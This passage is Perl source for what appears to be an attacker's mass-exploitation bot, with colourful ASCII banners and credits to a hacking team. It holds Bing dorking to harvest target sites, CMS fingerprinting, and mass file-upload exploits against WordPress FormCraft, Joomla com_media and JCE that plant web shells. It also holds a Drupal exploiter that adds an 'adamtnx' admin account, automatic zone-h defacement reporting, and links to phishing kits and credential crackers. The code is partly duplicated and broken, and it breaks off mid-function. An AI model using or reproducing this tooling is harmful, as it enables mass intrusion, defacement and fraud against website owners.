sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>ipv3bot.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
minibot();
}
####################################"
sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);

print "$link\n";
open(savea, '>>v3bot.txt');
    print savea "$link\n";
    close(savea);
  

            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;

open HANDLE,">","v3bot.txt";
print HANDLE "";
close HANDLE;}
}
}
###########
sub gassonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);
            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
}
sub minibot(){
open(tarrget,"v3bot.txt") or die "$!";
while(<tarrget>){
chomp($_);
$site = $_;
filter();
open HANDLE,">","botv3.txt";
print HANDLE "";
close HANDLE;

}
}

  sub checker(){
    print color("bold green")," Sh3llz List : ";
$open=<STDIN>;
chomp $open;
open(tarrget,"$open") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /http:\/\//)
{
$target = "$target";
}

$website = $target.$adtnx;
 $vuln2 =$vulnn;

$req=HTTP::Request->new(GET=>$website);
$ua=LWP::UserAgent->new();
$ua->timeout(30);
$response=$ua->request($req);
if($response->content=~ $adam )

 {
 print color 'reset';
 $Messageee  ="$vulnn";
print color("bold Green"), "";
open (TEXT, '>>work.txt');
print TEXT "$target$vuln2\n";
close (TEXT);
}
else {

print color 'reset';
$Messageee = " bad shell !!  ";
print color("bold red"), "";

}
{
print "[+] $target => $Messageee\n";
}
$adtnx= "";
chomp $adtnx;


$adam="WSO";
chomp($adam);


$vulnn=" Shell Work";
chomp($vulnn);

}

  }

  sub sites(){
    $tnx="
          ------------------------- checking :---------------------- 
                         [Wordpress-Joomla-Drupal-Prestashop-]
 \n"; sleep(2);
   print color("bold green");
   print $tnx;
      print color("reset");
      $tnx1="
                           [+] Coded by adam tnx /BotV3 [+]
 \n"; sleep(2);
   print color("bold blue");
   print $tnx1;
      print color("reset");


    print color("red"),"List : \n";
$list=<STDIN>;

open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
laweej();
}
system("PAUSE");

sub laweej($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);

my $tnx = $ua->get("$site")->content;
if($tnx =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
    print color('green');
    print "--WORDPRESS-- / $site \n";
    print color('reset');
open(save, '>>wordpress.txt');
    print save "$site\n";
        close(save);
   

}

elsif($tnx =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>|Joomla!|Joomla|joomla/) {
    print color('yellow');
    print "--JOOMLA--  / $site \n";
    print color('reset');
open(save, '>>joomla.txt');
    print save "$site\n";
    close(save);

    }
elsif($tnx =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
    print color('blue');
    print "--DRUPAL-- / $site \n";
    print color('reset');
open(save, '>>drupal.txt');
    print save "$site\n";
    close(save);
     

    }elsif($tnx =~/\/Prestashop|\/js\/jquery\/plugins\/|<meta name=\"Generator\" content=\"Prestashop/) {
    print ;
    print "--Prestashop-- / $site \n";
    print color('reset');
open(save, '>>Prestashop.txt');
    print save "$site\n";
    close(save);
    

    
}
}
  }
  

sub tnx(){
    $tnx ="

:::'###::::'########:::::'###::::'##::::'##:  '########:'##::: ##:'##::::'##: '##::::'##::'#######::
::'## ##::: ##.... ##:::'## ##::: ###::'###:  ... ##..:: ###:: ##:. ##::'##::  ##:::: ##:'##.... ##:
:'##:. ##:: ##:::: ##::'##:. ##:: ####'####:  ::: ##:::: ####: ##::. ##'##:::  ##:::: ##:..::::: ##:
'##:::. ##: ##:::: ##:'##:::. ##: ## ### ##:  ::: ##:::: ## ## ##:::. ###::::  ##:::: ##::'#######::
 #########: ##:::: ##: #########: ##. #: ##:  ::: ##:::: ##. ####::: ## ##:::.  ##:: ##::'##::::::::
 ##.... ##: ##:::: ##: ##.... ##: ##:.:: ##:  ::: ##:::: ##:. ###:: ##:. ##:::.  ## ##::: ##::::::::
 ##:::: ##: ########:: ##:::: ##: ##:::: ##:  ::: ##:::: ##::. ##: ##:::. ##:::.  ###:::: #########:
..:::::..::........:::..:::::..::..:::::..::  :::..:::::..::::..::..:::::..:::::. ..:::::.........::
\n\n
";

    print color('bold red');

print $tnx;
print color("bold green"), "Coder : Adam Tnx\n";
print color 'reset';
print color("bold green"),"Greetz to : bl4ck_knight & fallag kill3r & all my friends \n\n";
print color 'reset';
print color("bold yellow"),"Choose ^_^ :   \n1-Wordprees fromcraft shell upload \n2-Tnx helper \n3-Magento fucker \n4-drupal exploiter \n5-bing dorker \n6-backdoor scaner \n7-about me \n";
print color 'reset';

my $whattnxwant = <STDIN>;
chomp $whattnxwant;


if($whattnxwant eq '1'){
check();
}
if($whattnxwant eq '2'){
help();
}
if($whattnxwant eq '3'){
magento();
}
if($whattnxwant eq '4'){
drupal();
}
if($whattnxwant eq '5'){
dorker();
}
if($whattnxwant eq '6'){
backdoor();
}
if($whattnxwant eq '7'){
me();
}




sub help(){
print ("
  _______  _______  _______  _______ _________ _______  _______  _       _______ 
(  ____ \(  ____ )(  ___  )(       )\__   __/(  ___  )(  ___  )( \     (  ____ \
| (    \/| (    )|| (   ) || () () |   ) (   | (   ) || (   ) || (     | (    \/
| (_____ | (____)|| (___) || || || |   | |   | |   | || |   | || |     | (_____ 
(_____  )|  _____)|  ___  || |(_)| |   | |   | |   | || |   | || |     (_____  )
      ) || (      | (   ) || |   | |   | |   | |   | || |   | || |           ) |
/\____) || )      | )   ( || )   ( |   | |   | (___) || (___) || (____/Y\____) |
\_______)|/       |/     \||/     \|   )_(   (_______)(_______)(_______|_______)

prv8 letter ppl : https://ghostbin.com/paste/vb3s4m7u pwd : adamtnx
------------------------------------------------------------------------
apple scama : https://up.top4top.net/downloadf-704mhn031-zip.html
-----------------------------------------------------------------------
maillist grbber from shell : https://pastebin.com/3BDUtgPm
-----------------------------------------------------------------------
cpanel cracker : https://ghostbin.com/paste/3bv3f
          _______  _______  _       _________ _______  _______  _       _______ 
|\     /|(  ___  )(  ____ \| \    /\\__   __/(  ___  )(  ___  )( \     (  ____ \
| )   ( || (   ) || (    \/|  \  / /   ) (   | (   ) || (   ) || (     | (    \/
| (___) || (___) || |      |  (_/ /    | |   | |   | || |   | || |     | (_____ 
|  ___  ||  ___  || |      |   _ (     | |   | |   | || |   | || |     (_____  )
| (   ) || (   ) || |      |  ( \ \    | |   | |   | || |   | || |           ) |
| )   ( || )   ( || (____/\|  /  \ \   | |   | (___) || (___) || (____/Y\____) |
|/     \||/     \|(_______/|_/    \/   )_(   (_______)(_______)(_______|_______)

bot mass brute wp : https://up.top4top.net/downloadf-699i3dev1-rar.html
-------------------------------------------------------------------------
bypass shell : https://ghostbin.com/paste/kuzvt
------------------------------------------------------------------------
vhost config grabber (by fallag gassrini) : https://ghostbin.com/paste/agwyc
------------------------------------------------------------------------
wordpress shell uploader : https://up.top4top.net/downloadf-7046xo6d2-rar.html
-----------------------------------------------------------------------
               ///----------Enjoy-------///
");

}
sub check(){
    $tnx="
   ___,---.__          /'|`\          __,---,___
    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
  ,'        |           ~'\     /`~           |        `.
 /      ___//              `. ,'          ,  , \___      \
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |
|   /          /\_  `   .    |    ,      _/\          \   |
\  |           \ \`-.___ \   |   / ___,-'/ /           |  /
 \  \           | `._   `\\  |  //'   _,' |           /  /
  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
     ``       /     \    ,='/ \`=.    /     \       ''
             |__   /|\_,--.,-.--,--._/|\   __|
             /  `./  \\`\ |  |  | /,//' \,'  \
            /   /     ||--+--|--+-/-|     \   \
           |   |     /'\_\_\ | /_/_/`\     |   |
            \   \__, \_     `~'     _/ .__/   /
             `-._,-'   `-._______,-'   `-._,-'
              Wordpress fromcarte Shell uploader
               | By Adam Tnx | Fallaga Team |
 
";

        print color('bold green');
 
print $tnx;
print color("red"), "Put Your List and see the magic bb ;) :   \n";
print color('reset');
$list=<STDIN>;

open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    print color("green"), "[exploited]";
    print color('reset');
    print " $site\n";
    up();
}else{

 print "$site failed\n";
}

}

sub up(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="tnx.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzztnx = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//tnx.php'; 
my $taz = $ua->get("$upzztnx")->content;
if ($taz =~ /Adam tnx/){
   print color('bold green');
print "fucked !!!\n";
print "--> $upzztnx\n";

    print color('reset');
print color('reset');
open(save, '>>shellz.txt');   
print save "$upzztnx\n";   
close(save);
}else{
print "...Failed \n";
}
}

                            
}
sub magento(){
$tnx ="
            .                                    .               
         `  y`                                  /: ``            
         `` /d:                     --        `sd` .             
          ```:sd+.              -oooy:      /yd+.``              
         `` `` .ymh-           /syyydo   `ommo`````.             
         `-:``  `oym/         `yyyyNm   `ddy/   `.:`             
         ./:-.`` `.+-         +ys+hMm    y/`  ``.-::             
          .ss+-``` `         . -smdMs    -` .`./oy/              
           :+oo/:. ``       /- `o/yMo    ```.:/oo/.              
            -+os+:..-    `/hs: -/ydM:   .-`-/ooo/`               
               -:-.`-.`  ohh-y +- +M`  --.`---`                  
               :/o+:-.+/ `yd:/`/.-so :s/.-/o+/.                  
                 -.o`  -+:-h/hsd/--:+/`  //..                    
                         ./yo+-/+yo-                             
                            .`y- `                               
  Coded by Adam Tnx          `N:`                                
      fb/adam.ag.750          s.`                                
                               `                                 
    
 \n\n
";

    print color('bold red');

print $tnx;
print colored ("Coded By Adam Tnx - Run  |",'bold white on_red'),"\n";
print colored (" Magento Fucker <3  |",'bold white on_red'),"\n";
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;

print"[Magento] $site ";


$magentoxlink = "http://localhost/magentox.php";
my $exploitmag = "$magentoxlink?url=$site&submit=submit";
if($checkksbir =~/Success /) {

    print color('bold blue');
print " -- Done\n";
    print color('reset');
    open(save, '>>Brute.txt');
    print save "++ Magento ++ $site hydra|hydra77\n";
    close(save);
    }
    print color('bold blue');
print  "- Failed \n";
    print color('reset');


        }

}
sub drupal(){
  $tnx ="
            .                                    .               
         `  y`                                  /: ``            
         `` /d:                     --        `sd` .             
          ```:sd+.              -oooy:      /yd+.``              
         `` `` .ymh-           /syyydo   `ommo`````.             
         `-:``  `oym/         `yyyyNm   `ddy/   `.:`             
         ./:-.`` `.+-         +ys+hMm    y/`  ``.-::             
          .ss+-``` `         . -smdMs    -` .`./oy/              
           :+oo/:. ``       /- `o/yMo    ```.:/oo/.              
            -+os+:..-    `/hs: -/ydM:   .-`-/ooo/`               
               -:-.`-.`  ohh-y +- +M`  --.`---`                  
               :/o+:-.+/ `yd:/`/.-so :s/.-/o+/.                  
                 -.o`  -+:-h/hsd/--:+/`  //..                    
                         ./yo+-/+yo-                             
                            .`y- `                               
  Coded by Adam Tnx          `N:`                                
      fb/adam.ag.750          s.`                                
                               `                                 
    
 \n\n
";

    print color('bold blue');

print $tnx;
print color("red"), "W3lcome..New Mass Drupal exploiter  \n";
print color("green"), "If you need some website use the dorker \n";
print color("green"), " you will find it with this bot  \n";
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /www./) { $target = "www.$target"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });

my $exploit = "http://www.xgames.co.il/drupal_mass_exploiter.php";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success! Log in with username \"adamtnx\" and password \"admin\" at/) {
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] ";
print color ('green');
print "$target";
print color ('reset');
print " tneek :)  !! \n";


    open(save, '>>tnxVuln.txt');
  
    print save " Don3 ! $target | username : adamtnx | pass: admin\n";
  
    close(save);
}
else { 

#####################
###error madafak#####
#####################
print color ('blue');
print "$target";
print color ('reset');
print " OOPS !! not vuln! \n";
}

}
sub dorker(){
system('cls');


$logo="
  ____  _               _____             _             
 |  _ \(_)             |  __ \           | |            
 | |_) |_ _ __   __ _  | |  | | ___  _ __| | _____ _ __ 
 |  _ <| | '_ \ / _` | | |  | |/ _ \| '__| |/ / _ \ '__|
 | |_) | | | | | (_| | | |__| | (_) | |  |   <  __/ |   
 |____/|_|_| |_|\__, | |_____/ \___/|_|  |_|\_\___|_|   
                  __/ |                                  
                 |___/                                                     
";
print $logo;

print color("green"), "[1] World Wide     |> World Wide Grabber\n";
print color("green"), "[2] Mass Site Dump |> By Ip or Websites List\n";
print color("green"), "[3] Mass Site Dump |> Range Ip by Ip or Wbesite list\n";
print color("green"), "[4] i'm Idiot And I Don't Know What To Do \n";
print color("green"), "[5] Random Ip Genrator \n";
my $targett = <STDIN>;
chomp $targett;



if($targett eq '1')
{
print "[Just Put Your Dork And I will Scan All World Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("bold white"),"$country]\n";
print color('reset');
gassone();
}
}


if($targett eq '2')
{
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
get();
}else{
get();
}

}


}
if($targett eq '3')
{
tnxx2();
sub tnxx2(){
print "[Put A Ip List chen3a.txt]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);

  open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();

}else{
gett();
}

}
}
}


if($targett eq '4')
{
print ("
            Drupal Dorks: 
user/login powered by drupal
user/login
node/1
node/1
node/add/page
?q=user/1
?q=user/2
?q=user/3
?q=user/4
?q=user/5
            Wordpress Dorks :
inurl:/wp-content/plugins/gravityforms/
/wp-content/plugins/gravityforms/
index of /wp-content/uploads/gravity_forms/
inurl:/wp-content/uploads/gravity_forms/
inurl:/wp-content/plugins/gravityforms/
inurl:wp-content/plugins/revslider/
inurl:revslider
inurl:revslider_admin.php
inurl:revslider_front.php
inurl:plugins/revslider/
intext:Powered by Revslider
intitle:Index Of/ revslider
intitle:Index Of/wp-content/plugins/revslider
intitle:Index Of/admin/revslider
Index Of/admin/revslider
Index Of/wp-content/plugins/revslider
Index Of/ revslider
revslider_admin.php
inurl:dhia_jridi
/wp-admin/admin-post.php?page=wysija
admin-post.php?page=wysija 
                Joomla Dorks :
inurl:/index.php?option=com_jce
index.php?option=com_jce
index.php?option=com_aardvertiser
index.php?option=com_akobook
index.php?option=com_abbrev
index.php?option=com_gk3_photoslide
index.php?option=com_abc
index.php?option=com_aclassf
index.php?option=com_acprojects
index.php?option=com_acstartseite
index.php?option=com_acteammember
index.php?option=com_actions
index.php?option=com_acymailing
index.php?option=com_addressbook
index.php?option=com_adds
index.php?option=com_rsticketspro
index.php?option=com_adsmanager
index.php?option=com_advertising
index.php?option=com_ag_vodmatvil
index.php?option=com_agency
index.php?option=com_agenda
index.php?option=com_ajaxchat
index.php?option=com_alameda
index.php?option=com_alfresco
index.php?option=com_alfurqan15x
index.php?option=com_allcinevid
index.php?option=com_traxartist
index.php?option=com_flippingbook
index.php?option=com_amblog
index.php?option=com_aml_2
index.php?option=com_annonces
index.php?option=com_appointinator
index.php?option=com_appointment
index.php?option=com_aprice
index.php?option=com_arcadegames
index.php?option=com_archeryscores
index.php?option=com_articleman
index.php?option=com_articlemanager
index.php?option=com_autartimonial
index.php?option=com_avosbillets
index.php?option=com_awiki
index.php?option=com_uhp
index.php?option=com_beamospetition
index.php?option=com_beamspetition
index.php?option=com_bfquiztrial
index.php?option=com_bfsurvey
index.php?option=com_bfsurvey_basic
index.php?option=com_bfsurvey_pro
index.php?option=com_biblestudy
index.php?option=com_biblioteca
index.php?option=com_bidding
index.php?option=com_ccinvoices
index.php?option=com_ccnewsletter
index.php?option=com_forum
index.php?option=com_jshopping
index.php?option=com_jvehicles
index.php?option=com_linkr
index.php?option=com_mmsblog
index.php?option=com_mscomment
index.php?option=com_ninjarsssyndicator
index.php?option=com_onlineexam
index.php?option=com_orgchart
index.php?option=com_properties
index.php?option=com_rpx
index.php?option=com_sectionex
index.php?option=com_simpledownload
index.php?option=com_userstatus
index.php?option=com_aquiz
index.php?option=com_as
index.php?option=com_as_shop
index.php?option=com_msg
index.php?option=com_club
modules/mod_simplefileuploadv1.3


put all this in file txt === > tnx.txt then run script again and choose 1
");

}
if($targett eq '5')
{
tnxx1();
sub tnxx1(){
srand(time() ^ ($$ + ($$ << 15)));
print "Welcome to the ip Genrator how much ip u want ?\n";
my $ipnumtnx = <STDIN>;
chomp $ipnumtnx;

for (1..$ipnumtnx){
    print $spx = join ('.', (int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))))

          , "\n";
      open(save, '>>ips.txt');
    print save "$spx\n";
    close(save);

}
}
}

else{
print color("red"), "Not Found\n";
print color('reset');
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ip2.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();

}
minibot();
open HANDLE,">","v2tnx.txt";
print HANDLE "";
close HANDLE;


}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>v2tnx.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
minibot();


}
####################################"
sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);

print "$link\n";
open(savea, '>>tip2.txt');
    print savea "$link\n";
    close(savea);
  

            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;

open HANDLE,">","ip2.txt";
print HANDLE "";
close HANDLE;}
}
}
###########
sub gassonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);
            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
}
sub minibot(){
open(tarrget,"ip2.txt") or die "$!";
while(<tarrget>){
chomp($_);
$site = $_;
filter();
open HANDLE,">","ip2.txt";
print HANDLE "";
close HANDLE;

}
}
sub backdoor(){
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
print " ";
}
}
sub me(){
  print colored ("[ Tools coded by adam tnx|",'bold white on_black');
print colored (" Team : Fallaga Team / Giants ps |",'bold white on_green');
print colored ("[ There is no God but Allah, Muhammad is the Messenger of Allah ]",'bold white on_red'),"\n";
print colored("[ Muslim Hacker= Coder ]",'bold white on_blue'),"\n";
print color("red"), "heey = changing my bots and script with dosn't make you big hacker or coder :) so work hard and great your \n";
print color("green"), "[own]";
print color("red"), "bots";
}
}

}
sub media(){
    $tnx ="

:::'###::::'########:::::'###::::'##::::'##:  '########:'##::: ##:'##::::'##: '##::::'##::'#######::
::'## ##::: ##.... ##:::'## ##::: ###::'###:  ... ##..:: ###:: ##:. ##::'##::  ##:::: ##:'##.... ##:
:'##:. ##:: ##:::: ##::'##:. ##:: ####'####:  ::: ##:::: ####: ##::. ##'##:::  ##:::: ##:..::::: ##:
'##:::. ##: ##:::: ##:'##:::. ##: ## ### ##:  ::: ##:::: ## ## ##:::. ###::::  ##:::: ##::'#######::
 #########: ##:::: ##: #########: ##. #: ##:  ::: ##:::: ##. ####::: ## ##:::.  ##:: ##::'##::::::::
 ##.... ##: ##:::: ##: ##.... ##: ##:.:: ##:  ::: ##:::: ##:. ###:: ##:. ##:::.  ## ##::: ##::::::::
 ##:::: ##: ########:: ##:::: ##: ##:::: ##:  ::: ##:::: ##::. ##: ##:::. ##:::.  ###:::: #########:
..:::::..::........:::..:::::..::..:::::..::  :::..:::::..::::..::..:::::..:::::. ..:::::.........::
\n\n
";

    print color('bold red');

print $tnx;
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;

print"Com Media Upload Shellez $site...";
$tarmedia="$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
$shlez = "upmedia.php";
$shlz="$site/images/upmedia.php";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    print save " $site\n";
    close(save);
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$shlez] ]);
 $check = $ua->get($shlz);
if($check->content =~/TNX BOT V3/) {
    print "success \n [SHELL LINK] =>  $shlz\n ";
                open (TEXT, '>>/Shellez.txt');
                print TEXT "\n[ MEDIA SHELL] =>$shlz \n";
                close (TEXT);

        }
        }  else{
    print color('bold red');
print " Failed \n";
    print color('reset');
        }}
}

sub jce(){
    
   print color("red"), " [+]   Coded By Adam Tnx [+]\n"; sleep(1);           
   print color("green"), "[+]Contact : fb/adam.ag.750 [+]\n"; sleep(1);           

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);
print colored (" Your list: ",'bold white on_red');
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "++Can't open the Website list++ !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

foreach $site(@TARGETS){

chomp $site;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

print colored ("\n [Testing...] $site\n",'green');


$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
if ($res =~ m/No function call specified!/i){

print colored (" TRYING FOR UPLOAD :/ ",'blue'),"\n";
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["tnx.gif"],
        'action' => 'upload'

        ]
    )->decoded_content;


$remote = IO::Socket::INET->new(
        Proto=>
        PeerAddr=>"$site",
        PeerPort=>
        Timeout=>
        );
$def= "$site/tnx.gif";
print colored (" Vuln ... :D $site/tnx.gif\n",'bold white on_red');
open(save, '>>list.txt');
  
    print save "$site/tnx.gif\n";
  zonpost();
}else{
print colored (" [EXPLOIT FAIL]",'bold blue'),"\n";
}
    open(save, '>>list.txt');
    
    print save "$site/tnx.gif\n";
    
    close(save);
}
sub zonpost{
   print colored (" posting....",'bold white'),"\n";
$req = HTTP::Request->new(GET=>$link);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($req);
$ar = $response->content;
if ($ar =~ /Hacked|tnx/){

                $dmn= $link;
                $def="Adam tnx v3 Bot"; 
                $zn="http://zone-h.org/notify/single";
                $lwp=LWP::UserAgent->new;
                $res=$lwp  -> post($zn,[
                'defacer'     => $def,
                'domain1'   => $dmn,
                'hackmode' => '15',
                'reason'       => '1',
                'submit'       => 'Send',
                ]);
                if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
                print colored ("UPLOAD ZONE-H SUCESS $1",'bold green'),"\n";
                }
                else
                {
                print colored ("ZONE-H ERROR UPLOAD",'bold white'),"\n";
                }
                     }else{
                        print" Not Defaced !! \n";

}
}
}

sub info(){
  print color("bold white"),"Welcome to getting info zone . chose : \n";
  print color("yellow"),"1- joomla scan\n";
  print color("yellow"),"2- wordpress scan\n";
    print color("yellow"),"3- Grab all server sites \n";

$target= <STDIN>;
  chomp $target;

  if ($target eq '1')
  {
    joomla();
  }
  if ($target eq '2')
  {
